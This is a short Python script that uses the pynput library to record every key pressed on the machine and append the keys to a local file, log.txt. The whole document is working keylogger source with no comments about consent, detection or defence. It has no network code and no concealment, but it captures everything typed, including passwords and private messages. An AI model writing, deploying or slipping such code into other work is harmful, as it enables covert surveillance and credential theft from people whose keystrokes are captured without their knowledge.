from pynput import keyboard
keys = []
# Handle each key press
def on_press(key):
    keys.append(key.char if hasattr(key, 'char') else str(key))
    write_file()
# Save the logged keys to a file and clear the list
def write_file():
    with open("log.txt", "a") as file:
        file.write("\n".join(keys) + "\n")
    keys.clear()
# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()